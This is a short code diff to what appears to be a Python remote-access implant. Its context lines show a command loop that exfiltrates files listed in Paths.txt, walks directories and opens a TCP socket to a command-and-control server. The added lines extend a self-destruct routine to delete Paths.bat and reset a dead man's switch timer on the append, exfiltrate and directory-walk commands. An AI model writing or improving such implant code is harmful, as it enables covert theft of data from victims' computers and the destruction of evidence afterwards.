@@ -48,6 +48,10 @@ def send_exfil(data):
 
 #function to self destruct
 def self_destruct():
+    try:
+        os.remove("Paths.bat")
+    except:
+        print("Paths file already gone")
     remove(argv[0])
     sys.exit(0)
 
@@ -82,6 +86,8 @@ while(True):
 
     #append to paths
     if(comm == "2a"):
+        #reset dead man's switch
+        start_time = 0
         param = command.split(";")[1]
         file1 = open('Paths.txt', 'r')
         Lines = file1.readlines()
@@ -94,6 +100,8 @@ while(True):
 
     #exfil paths
     if(comm == "2e"):
+        #reset dead man's switch
+        start_time = 0
         #Paths.txt contains the areas we are interested in exfiltrating
         file1 = open('Paths.txt', 'r')
         #Line by line each path
@@ -142,6 +150,8 @@ while(True):
     
     #Perform oswalk on specified directory
     if(comm == "2w"):
+        #reset dead man's switch
+        start_time = 0
         # Create a TCP/IP socket
         c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Connect the socket to the port where the server is listening
